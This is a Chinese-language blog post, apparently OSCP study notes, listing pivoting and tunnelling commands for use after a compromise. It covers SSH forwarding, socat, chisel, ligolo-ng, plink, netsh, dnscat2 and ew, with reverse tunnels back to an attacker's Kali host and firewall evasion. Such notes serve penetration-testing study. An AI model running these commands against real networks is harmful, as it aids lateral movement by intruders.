@@ -1,0 +1,243 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>隧道代理 | 养猪日记</title>
+<meta name=keywords content><meta name=description content="Linux
+SSH
+-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 
+-N：仅实现端口转发功能，不登录ssh。 
+-L：表示local，本地端口转发； 
+
+知道目标主机的ssh账密的情况：
+
+本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 
+
+ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali
+
+ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+中间主机+远程端口+本地kali 远距离端口转发
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+
+
+SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 
+
+ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口]
+
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215
+
+
+
+
+本机kali开放ssh，需要ssh版本7.6以上：
+sudo systemctl restart ssh.service
+ssh -N -R 9998 kali@192.168.5.66
+socks隧道，kali的9998即代表远程主机的
+SSH 本地端口转发：
+DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口
+命令：
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="隧道代理"><meta property="og:description" content="Linux
+SSH
+-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 
+-N：仅实现端口转发功能，不登录ssh。 
+-L：表示local，本地端口转发； 
+
+知道目标主机的ssh账密的情况：
+
+本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 
+
+ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali
+
+ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+中间主机+远程端口+本地kali 远距离端口转发
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+
+
+SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 
+
+ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口]
+
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215
+
+
+
+
+本机kali开放ssh，需要ssh版本7.6以上：
+sudo systemctl restart ssh.service
+ssh -N -R 9998 kali@192.168.5.66
+socks隧道，kali的9998即代表远程主机的
+SSH 本地端口转发：
+DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口
+命令：
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+"><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="隧道代理"><meta name=twitter:description content="Linux
+SSH
+-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 
+-N：仅实现端口转发功能，不登录ssh。 
+-L：表示local，本地端口转发； 
+
+知道目标主机的ssh账密的情况：
+
+本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 
+
+ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali
+
+ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+中间主机+远程端口+本地kali 远距离端口转发
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+
+
+SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 
+
+ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口]
+
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215
+
+
+
+
+本机kali开放ssh，需要ssh版本7.6以上：
+sudo systemctl restart ssh.service
+ssh -N -R 9998 kali@192.168.5.66
+socks隧道，kali的9998即代表远程主机的
+SSH 本地端口转发：
+DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口
+命令：
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"隧道代理","item":"https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"隧道代理","name":"隧道代理","description":"Linux SSH -g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 -N：仅实现端口转发功能，不登录ssh。 -L：表示local，本地端口转发； 知道目标主机的ssh账密的情况： 本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况 ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 中间主机+远程端口+本地kali 远距离端口转发 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口] ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215 本机kali开放ssh，需要ssh版本7.6以上： sudo systemctl restart ssh.service ssh -N -R 9998 kali@192.168.5.66 socks隧道，kali的9998即代表远程主机的 SSH 本地端口转发： DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口\n命令：\nssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 ","keywords":[],"articleBody":"Linux SSH -g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 -N：仅实现端口转发功能，不登录ssh。 -L：表示local，本地端口转发； 知道目标主机的ssh账密的情况： 本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况 ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 中间主机+远程端口+本地kali 远距离端口转发 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口] ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215 本机kali开放ssh，需要ssh版本7.6以上： sudo systemctl restart ssh.service ssh -N -R 9998 kali@192.168.5.66 socks隧道，kali的9998即代表远程主机的 SSH 本地端口转发： DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口\n命令：\nssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 SSH动态端口转发 ssh -qTfnN -D 7080 kali@VPS地址\nDMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，通过一的9999可以访问到第二台主机的任何路由\n命令：\nssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215 SSH 远程端口转发 主要是防火墙规避，主机和攻击机通过ssh外联建立隧道，可以访问到DMZ第二台主机的映射端口\n需要kali开启ssh\n命令：\nssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 SSH远程动态端口转发 上面一种场景的增强版，socks隧道：\n需要kali开启ssh\n命令：\nssh -N -R 9998 kali@192.168.118.4 sshuttle 工具 适用于有目标ssh密码的情况，可以在主机上直接添加路由\nhttps://github.com/sshuttle/sshuttle sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24 SOCAT 常用 socat TCP-LISTEN:8009,fork,reuseaddr tcp:10.4.187.215:22 \u0026 socat -ddd TCP-LISTEN:1194,fork TCP:51.79.169.191:1194 socat -ddd UDP-LISTEN:1194,fork TCP:51.79.169.191:1194 chisel 工具 扫描速度很慢，如果是访问端口可以接受 http+ssh嵌套\nhttps://github.com/jpillora/chisel 场景一，代理被攻击机的本地127.0.0.1:3306 kali当作服务端： ./chisel server -p 6666 --reverse 被攻击机： ./chisel client -v kali_ip:6666 R:0.0.0.0:8888:127.0.0.1:3306 socsk5 ./chisel client -v 192.168.45.198:6666 R:5000:socks ligolo 工具 当前情况下的最好选择 https://github.com/sysdream/ligolo https://github.com/nicocha30/ligolo-ng kali配置网卡： sudo ip tuntap add user kali mode tun ligolo \u0026\u0026 sudo ip link set ligolo up 服务端： ./proxy -selfcert 客户端： agent.exe -connect 192.168.45.234:11601 -ignore-cert 服务端收到信息后配置： session tunnel_start 添加路由： sudo ip route add 172.16.30.0/24 dev ligolo 常见命令： ip rout WINDOWS ssh 确认ssh： where ssh 确认版本， 高于7.6才可以远程动态端口转发 ssh.exe -V 命令是一样的： ssh -N -R 9998 kali@192.168.118.4 plink 应用场景类似于远程端口转发\n命令： C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4 如果处于非交互式shell: cmd.exe /c echo y | .\\plink.exe -ssh -l kali -pw -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7 Netsh 类似于本地端口转发\n命令： netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215 防火墙允许相关： netsh advfirewall firewall add rule name=\"port_forward_ssh_2222\" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow DNS隧道 在DNS服务器上运行： dnscat2-server feline.corp 在受害者服务器上运行： ./dnscat feline.corp 在服务上开启端口转发： 使用会话 window -i 1 端口转发 listen 0.0.0.0:4646 172.16.223.217:4646 ew https://github.com/idlefire/ew ./ew -s ssocksd -l 8888 端口转发： ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999 ","wordCount":"300","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">隧道代理</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;300 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ssh>SSH</a></li><li><a href=#ssh-本地端口转发>SSH 本地端口转发：</a></li><li><a href=#ssh动态端口转发>SSH动态端口转发</a></li><li><a href=#ssh-远程端口转发>SSH 远程端口转发</a></li><li><a href=#ssh远程动态端口转发>SSH远程动态端口转发</a></li><li><a href=#sshuttle-工具>sshuttle 工具</a></li><li><a href=#socat-常用>SOCAT 常用</a></li></ul><ul><li><a href=#ssh-1>ssh</a></li><li><a href=#plink>plink</a></li><li><a href=#netsh>Netsh</a></li></ul></nav></div></details></div><div class=post-content><h1 id=linux>Linux<a hidden class=anchor aria-hidden=true href=#linux>#</a></h1><h2 id=ssh>SSH<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h2><pre tabindex=0><code>-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 
+-N：仅实现端口转发功能，不登录ssh。 
+-L：表示local，本地端口转发； 
+
+知道目标主机的ssh账密的情况：
+
+本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 
+
+ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali
+
+ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 
+
+中间主机+远程端口+本地kali 远距离端口转发
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+
+
+SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 
+
+ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口]
+
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215
+
+
+
+
+本机kali开放ssh，需要ssh版本7.6以上：
+sudo systemctl restart ssh.service
+ssh -N -R 9998 kali@192.168.5.66
+socks隧道，kali的9998即代表远程主机的
+</code></pre><h2 id=ssh-本地端口转发>SSH 本地端口转发：<a hidden class=anchor aria-hidden=true href=#ssh-本地端口转发>#</a></h2><p>DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口</p><p>命令：</p><pre tabindex=0><code>ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+</code></pre><p><img loading=lazy src=/oscp_img/Pasted%20image%2020240314213959.png alt></p><h2 id=ssh动态端口转发>SSH动态端口转发<a hidden class=anchor aria-hidden=true href=#ssh动态端口转发>#</a></h2><p>ssh -qTfnN -D 7080 kali@VPS地址</p><p>DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，通过一的9999可以访问到第二台主机的任何路由</p><p>命令：</p><pre tabindex=0><code>ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+</code></pre><p><img loading=lazy src=/oscp_img/Pasted%20image%2020240314214449.png alt></p><h2 id=ssh-远程端口转发>SSH 远程端口转发<a hidden class=anchor aria-hidden=true href=#ssh-远程端口转发>#</a></h2><p>主要是防火墙规避，主机和攻击机通过ssh外联建立隧道，可以访问到DMZ第二台主机的映射端口</p><p>需要kali开启ssh</p><p>命令：</p><pre tabindex=0><code>ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+</code></pre><p><img loading=lazy src=/oscp_img/Pasted%20image%2020240314214634.png alt></p><h2 id=ssh远程动态端口转发>SSH远程动态端口转发<a hidden class=anchor aria-hidden=true href=#ssh远程动态端口转发>#</a></h2><p>上面一种场景的增强版，socks隧道：</p><p>需要kali开启ssh</p><p>命令：</p><pre tabindex=0><code>ssh -N -R 9998 kali@192.168.118.4
+</code></pre><p><img loading=lazy src=/oscp_img/Pasted%20image%2020240314214953.png alt></p><h2 id=sshuttle-工具>sshuttle 工具<a hidden class=anchor aria-hidden=true href=#sshuttle-工具>#</a></h2><p>适用于有目标ssh密码的情况，可以在主机上直接添加路由</p><pre tabindex=0><code>https://github.com/sshuttle/sshuttle
+
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+</code></pre><h2 id=socat-常用>SOCAT 常用<a hidden class=anchor aria-hidden=true href=#socat-常用>#</a></h2><pre tabindex=0><code>socat TCP-LISTEN:8009,fork,reuseaddr tcp:10.4.187.215:22 &amp; 
+
+socat -ddd TCP-LISTEN:1194,fork TCP:51.79.169.191:1194
+
+socat -ddd UDP-LISTEN:1194,fork TCP:51.79.169.191:1194
+</code></pre><h1 id=chisel-工具-扫描速度很慢如果是访问端口可以接受>chisel 工具 扫描速度很慢，如果是访问端口可以接受<a hidden class=anchor aria-hidden=true href=#chisel-工具-扫描速度很慢如果是访问端口可以接受>#</a></h1><p>http+ssh嵌套</p><pre tabindex=0><code>https://github.com/jpillora/chisel
+
+场景一，代理被攻击机的本地127.0.0.1:3306
+
+kali当作服务端：
+./chisel server -p 6666 --reverse
+
+被攻击机：
+./chisel client -v kali_ip:6666 R:0.0.0.0:8888:127.0.0.1:3306
+
+socsk5
+./chisel client -v 192.168.45.198:6666 R:5000:socks
+</code></pre><h1 id=ligolo-工具-当前情况下的最好选择>ligolo 工具 当前情况下的最好选择<a hidden class=anchor aria-hidden=true href=#ligolo-工具-当前情况下的最好选择>#</a></h1><pre tabindex=0><code>https://github.com/sysdream/ligolo
+https://github.com/nicocha30/ligolo-ng
+
+kali配置网卡：
+sudo ip tuntap add user kali mode tun ligolo &amp;&amp; sudo ip link set ligolo up
+
+服务端：
+./proxy -selfcert
+
+客户端：
+agent.exe -connect 192.168.45.234:11601 -ignore-cert
+
+
+服务端收到信息后配置：
+session
+tunnel_start
+
+添加路由：
+sudo ip route add 172.16.30.0/24 dev ligolo
+</code></pre><h1 id=常见命令>常见命令：<a hidden class=anchor aria-hidden=true href=#常见命令>#</a></h1><pre tabindex=0><code>ip rout
+</code></pre><h1 id=windows>WINDOWS<a hidden class=anchor aria-hidden=true href=#windows>#</a></h1><h2 id=ssh-1>ssh<a hidden class=anchor aria-hidden=true href=#ssh-1>#</a></h2><pre tabindex=0><code>确认ssh：
+where ssh
+
+确认版本， 高于7.6才可以远程动态端口转发
+ssh.exe -V
+
+命令是一样的：
+ssh -N -R 9998 kali@192.168.118.4
+</code></pre><h2 id=plink>plink<a hidden class=anchor aria-hidden=true href=#plink>#</a></h2><p>应用场景类似于远程端口转发</p><pre tabindex=0><code>命令：
+C:\Windows\Temp\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+
+如果处于非交互式shell:
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
+</code></pre><h2 id=netsh>Netsh<a hidden class=anchor aria-hidden=true href=#netsh>#</a></h2><p>类似于本地端口转发</p><pre tabindex=0><code>命令：
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+
+防火墙允许相关：
+netsh advfirewall firewall add rule name=&#34;port_forward_ssh_2222&#34; protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+</code></pre><h1 id=dns隧道>DNS隧道<a hidden class=anchor aria-hidden=true href=#dns隧道>#</a></h1><pre tabindex=0><code>在DNS服务器上运行：
+dnscat2-server feline.corp
+
+在受害者服务器上运行：
+./dnscat feline.corp
+
+
+在服务上开启端口转发：
+使用会话
+window -i 1
+端口转发
+listen 0.0.0.0:4646 172.16.223.217:4646
+</code></pre><h1 id=ew>ew<a hidden class=anchor aria-hidden=true href=#ew>#</a></h1><pre tabindex=0><code>https://github.com/idlefire/ew
+
+./ew -s ssocksd -l 8888
+
+端口转发：
+./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/><span class=title>« Prev</span><br><span>隐藏信息获取&破解</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
